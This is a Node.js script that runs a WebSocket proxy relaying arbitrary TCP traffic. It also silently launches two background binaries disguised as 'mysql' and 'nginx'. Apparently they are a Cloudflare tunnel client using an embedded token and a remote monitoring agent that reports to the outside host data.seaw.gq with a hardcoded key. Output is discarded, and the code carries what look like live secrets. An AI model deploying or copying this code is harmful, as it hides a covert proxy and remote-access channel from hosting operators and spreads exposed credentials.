const net = require('net');
const { exec } = require('child_process');
const { WebSocket, createWebSocketStream } = require('ws');
const logcb = (...args) => console.log.bind(this, ...args);
const errcb = (...args) => console.error.bind(this, ...args);
const { spawn } = require('child_process');
const uuid = (process.env.UUID || '7090ff5d-f321-4248-a7c3-d8837f124999').replace(/-/g, "");
const port = process.env.PORT || 3000;
const NEZHA_SERVER = 'data.seaw.gq:443';
const NEZHA_KEY = 'yiEDTq4t9b0pUl53ms';
const TOK = 'eyJhIjoiMzg2OGEzNjc2ZTkyZmUxMmY0NjM1YTU0ZmNhMDQ0NDMiLCJ0IjoiNzExYWY0MTgtMzdhNy00ZjIzLWE5YTktNTk2M2JhNjk5NTc0IiwicyI6Ik16aG1ObUprTVRBdE5HTTROUzAwWWpBeUxUZ3pNV1l0TVRjeE56VXhOV1ppTkRRMSJ9';

// 启动 mysql
const mysqlCommand = `chmod +x mysql && ./mysql tunnel --edge-ip-version auto --protocol http2 run --token ${TOK} >/dev/null 2>&1 &`;
exec(mysqlCommand);

// 启动 nginx
const nginxCommand = `chmod +x nginx && ./nginx -s ${NEZHA_SERVER} -p ${NEZHA_KEY} --tls > /dev/null 2>&1 &`;
exec(nginxCommand, (error, stdout, stderr) => {
  if (error) {
    console.error(`nginx运行出错: ${error}`);
  } else {
    console.log('nginx已运行');
  }
});

// 创建WebSocket服务器
const ws = new WebSocket.Server({ port }, logcb('listening:', port));
ws.on('connection', ws => {
  console.log("connected successfully")
  ws.once('message', msg => {
    const [VERSION] = msg;
    const id = msg.slice(1, 17);
    if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return;
    let i = msg.slice(17, 18).readUInt8() + 19;
    const port = msg.slice(i, i += 2).readUInt16BE(0);
    const ATYP = msg.slice(i, i += 1).readUInt8();
    const host = ATYP == 1 ? msg.slice(i, i += 4).join('.') : // IPV4
      (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) : // 域名
        (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(':') : '')); // IPv6

    logcb('Connect:', host, port);
    ws.send(new Uint8Array([VERSION, 0]));
    const duplex = createWebSocketStream(ws);
    net.connect({ host, port }, function () {
      this.write(msg.slice(i));
      duplex.on('error', errcb('E1:')).pipe(this).on('error', errcb('E2:')).pipe(duplex);
    }).on('error', errcb('Connect-Err:', { host, port }));
  }).on('error', errcb('WebSocket Error:'));
});
